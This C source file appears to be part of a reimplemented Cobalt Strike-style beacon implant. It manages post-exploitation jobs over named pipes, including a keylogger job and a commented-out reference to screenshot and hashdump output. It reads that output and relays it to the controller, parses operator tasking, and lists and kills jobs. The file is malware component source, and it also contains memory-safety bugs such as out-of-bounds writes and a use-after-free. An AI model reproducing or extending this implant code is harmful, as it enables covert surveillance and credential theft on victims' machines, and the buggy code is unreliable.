#include "Util.h"
#include "Job.h"
BeaconJob* gBeaconJob = NULL;
#pragma warning(disable:4996)
// 伪造的函数定义，需要根据实际情况进行替换
int g_job_Number;
void Add_Beacon_Job(BeaconJob* pBeaconJob)
{
    pBeaconJob->JobNumber = g_job_Number;
    ++g_job_Number;
    BeaconJob* pgBeaconJob = gBeaconJob;
    BeaconJob* temp;
    if (pgBeaconJob)
    {
        do
        {
            temp = pgBeaconJob;
            pgBeaconJob = pgBeaconJob->Linked;
        } while (pgBeaconJob);
        temp->Linked = pBeaconJob;
    }
    else
    {
        gBeaconJob = pBeaconJob;
    }
}


void Add_BeaconInternal_Job(HANDLE hNamedPipe, int job_process_pid, int job_type, char* job_name, int lasting)
{
    BeaconJob* psshBeaconJob = (BeaconJob*)malloc(sizeof(BeaconJob));
    psshBeaconJob->hWritePipe = (HANDLE)-1;
    psshBeaconJob->Linked = 0;
    psshBeaconJob->hReadPipe = hNamedPipe;
    psshBeaconJob->state = 1;
    psshBeaconJob->kill = 0;
    psshBeaconJob->JobProcessPid = job_process_pid;
    psshBeaconJob->JobType = job_type;
    psshBeaconJob->lasting = lasting;
    strncpy(psshBeaconJob->JobName, job_name, 64);
    Add_Beacon_Job(psshBeaconJob);
}

BOOL ConnectPipe(int dwFlagsAndAttributes, HANDLE* hNamedPipe, LPCSTR lpNamedPipeName)
{
    HANDLE i;
    DWORD Mode;
    dwFlagsAndAttributes = dwFlagsAndAttributes | 0x100000;
    for (i = CreateFileA(lpNamedPipeName, GENERIC_READ | GENERIC_WRITE, 0, 0, 3u, dwFlagsAndAttributes | 0x100000, 0);
        ;
        i = CreateFileA(lpNamedPipeName, GENERIC_READ | GENERIC_WRITE, 0, 0, 3u, dwFlagsAndAttributes, 0))
    {
        *hNamedPipe = i;
        if (i != (HANDLE)-1)
        {
            break;
        }
        if (GetLastError() != 231)
        {
            return 0;
        }
        if (!WaitNamedPipeA(lpNamedPipeName, 0x2710))
        {
            SetLastError(0x102);
            return 0;
        }
    }
    Mode = 0;
    if (SetNamedPipeHandleState(*hNamedPipe, &Mode, 0, 0))
    {
        return 1;
    }
    DisconnectNamedPipe(*hNamedPipe);
    CloseHandle(*hNamedPipe);
    return 0;
}

int BeaconDataCopyToBuf(unsigned char* parser, char* buffer, int buffer_size, size_t* lenn)
{
    int copy_size = bigEndianUint32(parser);
    if (!copy_size)
    {
        return 0;
    }
    if (copy_size + 1 > buffer_size)
    {
        return 0;
    }
    char* data = parser + 4;
    if (!data)
    {
        return 0;
    }
    memcpy(buffer, data, copy_size);
    buffer[copy_size] = 0;
    *lenn = copy_size;
    return copy_size + 1;
}

BOOL ConnectJobPipe(HANDLE* hNamedPipe, int dwFlagsAndAttributes, CHAR* NamedPipeName)
{
    if (dwFlagsAndAttributes)
    {
        return ConnectPipe(dwFlagsAndAttributes, hNamedPipe, NamedPipeName);
    }
    BOOL ret = ConnectPipe(0, hNamedPipe, NamedPipeName);
    return ret;
}
void KEYLOGGEJob(int FlagsAndAttributes, char* commandBuf, int lenn, int lasting) {
    char job_name[64] = { 0 };
    CHAR NamedPipeName[64] = { 0 };
    HANDLE hNamedPipe;

    uint8_t job_process_pidd[4];
    uint8_t job_typee[2];
    uint8_t timeoutt[2];
    unsigned char* job_process_piddtstart = commandBuf;
    unsigned char* job_typeestart = commandBuf + 4;
    unsigned char* timeouttstart = commandBuf + 6;
    memcpy(job_process_pidd, job_process_piddtstart, 4);
    memcpy(job_typee, job_typeestart, 2);
    memcpy(timeoutt, timeouttstart, 2);
    int job_process_pid = bigEndianUint32(job_process_pidd);
    int job_type = Readshort(job_typee);
    int timeout = Readshort(timeoutt);
    size_t Bufflen;
    if (BeaconDataCopyToBuf(timeouttstart+2, NamedPipeName, 64 , &Bufflen) && BeaconDataCopyToBuf(timeouttstart+ 6+Bufflen, job_name, 64,&Bufflen)) {
        int dwFlagsAndAttributes = FlagsAndAttributes != 0 ? 0x20000 : 0;
        int number = 0;
        while (!ConnectJobPipe(&hNamedPipe, dwFlagsAndAttributes, NamedPipeName))
        {
            Sleep(500);
            if (++number >= 20)
            {
                return;
            }
        }
        if (timeout)
        {
            CheckTimeout(hNamedPipe, timeout);

        }
        
        Add_BeaconInternal_Job(hNamedPipe, job_process_pid, job_type, job_name, lasting);
    }
}

CreatePipeJob createjob() {
    BOOL bRet = FALSE;

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES securityAttributes = { 0 };
    STARTUPINFO si = { 0 };

    // Set the security attributes for the pipe
    securityAttributes.bInheritHandle = TRUE;
    securityAttributes.nLength = sizeof(securityAttributes);
    securityAttributes.lpSecurityDescriptor = NULL;
    // Create an anonymous pipe
    bRet = CreatePipe(&hReadPipe, &hWritePipe, &securityAttributes, 0);
    if (FALSE == bRet) {
        printf("CreatePipe");
    }
    // Set up the parameters for the new process
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    CreatePipeJob CreatePipeJob;
    CreatePipeJob.si = si;
    CreatePipeJob.hReadPipe = hReadPipe;
    CreatePipeJob.hWritePipe = hWritePipe;
    return CreatePipeJob;

}

BeaconJob* Add_Beacon_0Job(HANDLE hProcess, HANDLE hThread, int dwProcessId, int dwThreadId, HANDLE hReadPipe, HANDLE hWritePipe, const char* jobname)
{
    BeaconJob* pBeaconJob = (BeaconJob*)malloc(sizeof(BeaconJob));
    pBeaconJob->pHandle = hProcess;
    pBeaconJob->hThread = hThread;
    pBeaconJob->dwProcessId = dwProcessId;
    pBeaconJob->dwThreadId = dwThreadId;
    pBeaconJob->Linked = 0;
    pBeaconJob->hReadPipe = hReadPipe;
    pBeaconJob->hWritePipe = hWritePipe;
    pBeaconJob->state = 0;
    pBeaconJob->kill = 0;
    pBeaconJob->JobType = 0;
    pBeaconJob->JobProcessPid = dwProcessId;
    pBeaconJob->lasting = 0;
    _snprintf(pBeaconJob->JobName, 0x40u, "%s", jobname);
    Add_Beacon_Job(pBeaconJob);
    return pBeaconJob;
}


// <summary>
/// 对beacon jos进行清理,删除停止状态的任务
/// </summary>
void del_beacon_job()
{
    BeaconJob* pgBeaconJob = gBeaconJob;
    if (pgBeaconJob)
    {
        do
        {
            if (pgBeaconJob->kill == 1)
            {
                if (pgBeaconJob->state)
                {
                    if (pgBeaconJob->state == 1)
                    {
                        DisconnectNamedPipe(pgBeaconJob->hReadPipe);
                        CloseHandle(pgBeaconJob->hReadPipe);
                    }
                }
                else
                {
                    CloseHandle(pgBeaconJob->pHandle);
                    CloseHandle(pgBeaconJob->hThread);
                    CloseHandle(pgBeaconJob->hReadPipe);
                    CloseHandle(pgBeaconJob->hWritePipe);
                }
            }
            pgBeaconJob = pgBeaconJob->Linked;
        } while (pgBeaconJob);

    }
    pgBeaconJob = gBeaconJob;
    BeaconJob* temp = 0;
    while (pgBeaconJob)
    {
        if (pgBeaconJob->kill == 1)
        {
            if (temp)
            {
                temp->Linked = pgBeaconJob->Linked;
                free(pgBeaconJob);
                pgBeaconJob = pgBeaconJob->Linked;
            }
            else
            {
                gBeaconJob = pgBeaconJob->Linked;
                BeaconJob* temp1 = gBeaconJob;
                free(pgBeaconJob);
                pgBeaconJob = temp1;
            }
        }
        else
        {
            temp = pgBeaconJob;
            pgBeaconJob = pgBeaconJob->Linked;
        }
    }
}


void beacon_JobKill(char* Taskdata, int Task_size)
{
    BeaconJob* pBeaconJob = gBeaconJob;
    datap pdatap;
    BeaconDataParse(&pdatap, Taskdata, Task_size);
    int jobid = BeaconDataShort(&pdatap);
    while (pBeaconJob)
    {
        if (pBeaconJob->JobNumber == jobid)
        {
            pBeaconJob->kill = 1;
        }
        pBeaconJob = pBeaconJob->Linked;
    }
    del_beacon_job();
}
void beacon_jobs() {
    BeaconJob* pBeaconJob = gBeaconJob;
    formatp pformatp;

    // 初始化格式化输出
    BeaconFormatAlloc(&pformatp, 0x8000);

    // 遍历任务列表，格式化输出
    while (pBeaconJob) {
        BeaconFormatPrintf(&pformatp, "%d\t%d\t%s\n", pBeaconJob->JobNumber, pBeaconJob->JobProcessPid, pBeaconJob->JobName);
        pBeaconJob = pBeaconJob->Linked;
    }

    // 获取格式化输出的长度和指针
    int length = BeaconFormatlength(&pformatp);
    char* buffer = BeaconFormatOriginalPtr(&pformatp);

    // 发送格式化输出给 Beacon
    
    uint8_t id[21] = "JID\tPID\tDescription\n";
    uint8_t xiahua[21] = "---\t---\t-----------\n";
    size_t metaInfoSize1 = sizeof(id) + sizeof(xiahua) + length-3;
    unsigned char* metaInfoconcatenated1 = (unsigned char*)malloc(metaInfoSize1);
    metaInfoconcatenated1[metaInfoSize1] = '\0';
    memcpy(metaInfoconcatenated1,id, sizeof(id));
    memcpy(metaInfoconcatenated1+ sizeof(id)-1, xiahua, sizeof(xiahua));
    memcpy(metaInfoconcatenated1 + sizeof(id) + sizeof(xiahua)-2, buffer, length);
    
    DataProcess(metaInfoconcatenated1, metaInfoSize1, 0);
   

    // 释放资源
    BeaconFormatFree(&pformatp);
}

unsigned char* ParsepipeName(unsigned char* buf, size_t* argsize , size_t* len) {
    uint8_t argLenBytes[4];
    if (*argsize == 0) {
        memcpy(argLenBytes, buf + 8, 4);
        uint32_t argLen = bigEndianUint32(argLenBytes);
        if (argLen != 0) {
            unsigned char* arg = (unsigned char*)malloc(argLen);
            memcpy(arg, buf + 12, argLen);
            arg[argLen] = '\0';
            *argsize = 12 + argLen;
            *len = argLen;
            return arg;
        }

    }
    else
    {
        memcpy(argLenBytes, buf + *argsize, 4);
        uint32_t argLen = bigEndianUint32(argLenBytes);
        if (argLen != 0) {
            unsigned char* arg = (unsigned char*)malloc(argLen);
            memcpy(arg, buf + 4 + *argsize, argLen);
            arg[argLen] = '\0';
            *argsize = 4 + *argsize + argLen;
            *len = argLen;
            return arg;
        }

    }


}
struct ThreadArgs {
    unsigned char* pipeName;
    uint16_t* sleepTime;
    uint16_t* callbackType;
    unsigned char* JobName;
    uint32_t PIDD;
};

void CheckTimeout(HANDLE hNamedPipe, int timeout)
{
    DWORD TotalBytesAvail = 0;
    int time = timeout + GetTickCount();
    while (GetTickCount() < time && PeekNamedPipe(hNamedPipe, 0, 0, 0, &TotalBytesAvail, 0) && !TotalBytesAvail)
    {
        Sleep(500);
    }
}
DWORD WINAPI PipeJobHandla(LPVOID lpParam) {
    Sleep(2000);
    struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
    unsigned char* pipeName = args->pipeName;
    uint16_t* sleepTime = args->sleepTime;
    uint16_t* callbackType = args->callbackType;
    unsigned char* JobName = args->JobName;
    uint32_t* PIDD = args->PIDD;
    HANDLE hNamedPipe;
    int number = 0;
    HANDLE i;
    DWORD Mode;
    int resBool = 0;
    LPCSTR aaa = pipeName;
    while (!resBool) {
        for (i = CreateFileA(aaa, GENERIC_READ | GENERIC_WRITE, 0, 0, 3u, 0 | 0x100000, 0);
            ;
            i = CreateFileA(aaa, GENERIC_READ | GENERIC_WRITE, 0, 0, 3u, 0, 0))
        {
            if (i == INVALID_HANDLE_VALUE) {
                resBool = 0;
            }
            hNamedPipe = i;
            if (i != (HANDLE)-1)
            {
                break;
            }
            if (GetLastError() != 231)
            {
                resBool = 0;
                break;
            }
            if (!WaitNamedPipeA(aaa, 0x2710))
            {
                SetLastError(0x102);
                resBool = 0;
                break;
            }
        }
        Mode = 0;
        if (SetNamedPipeHandleState(hNamedPipe, &Mode, 0, 0))
        {
            resBool = 1;
        }
        else
        {
            DisconnectNamedPipe(hNamedPipe);
            CloseHandle(hNamedPipe);
            resBool = 0;
        }
        if (resBool == 0) {
            Sleep(500);
            if (++number >= 20)
            {
                BeaconErrorD(20, GetLastError());
                return;
            }
        }
    }
    if (sleepTime)
    {
        CheckTimeout(hNamedPipe, sleepTime);
    }
    char buffer[10000];
    DWORD bytesRead;
    OVERLAPPED overlap = { 0 };
    ReadFile(hNamedPipe, buffer, sizeof(buffer), NULL, &overlap);
    DataProcess(buffer, overlap.InternalHigh, 0);
    Add_BeaconInternal_Job(hNamedPipe, PIDD, callbackType, JobName, 0);
    //HANDLE pipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    //if (pipe == INVALID_HANDLE_VALUE) {
    //    fprintf(stderr, "Failed to open pipe (%lu)\n", GetLastError());
    //    return NULL;
    //}
    

}
void PipeJob(unsigned char* buf, size_t* commandBuflen, size_t* Bufflen) {
    size_t argsize = 0;
    unsigned char* bufstart = buf;
    uint8_t PID[4];
    uint8_t callbackTypeByte[2];
    uint8_t sleepTimeByte[2];
    memcpy(PID, bufstart, 4);
    memcpy(callbackTypeByte, bufstart+4,2);
    memcpy(sleepTimeByte, bufstart+6, 2);
    uint32_t PIDD = bigEndianUint32(PID);
    uint16_t callbackType= Readshort(callbackTypeByte);
    uint16_t sleepTime = Readshort(sleepTimeByte);
    size_t pipeNamelen = 0;
    size_t JobNamelen = 0;
    unsigned char* JobName = 0;
    unsigned char* pipeName = 0;
    datap pdatap;
    BeaconDataParse(&pdatap, buf, commandBuflen);
    int job_process_pid = BeaconDataInt(&pdatap);
    pipeName = ParsepipeName(buf, &argsize,&pipeNamelen);
    JobName = ParsepipeName(buf, &argsize,&JobNamelen);

    //if (callbackType != CALLBACK_OUTPUT_UTF8 && callbackType != CALLBACK_SCREENSHOT && callbackType != CALLBACK_HASHDUMP) 
    if(pipeNamelen !=0 && JobNamelen !=0 )
    {
        struct ThreadArgs* args = (struct ThreadArgs*)malloc(sizeof(struct ThreadArgs));
        if (args == NULL) {
            // 处理内存分配失败的情况
            return NULL;
        }

        args->pipeName = pipeName;
        args->sleepTime = sleepTime;
        args->callbackType = callbackType;
        args->JobName = JobName;
        args->PIDD = PIDD;
        HANDLE myThread;
        myThread = CreateThread(
            NULL,                       // 默认线程安全性
            0,                          // 默认堆栈大小
            PipeJobHandla,           // 线程函数
            args,                       // 传递给线程函数的参数
            0,                          // 默认创建标志
            NULL);                      // 不存储线程ID
        if (myThread == NULL) {
            fprintf(stderr, "Failed to create thread. Error code: %lu\n", GetLastError());
            return 1;
        }
    }
   
    return 0;
    

}


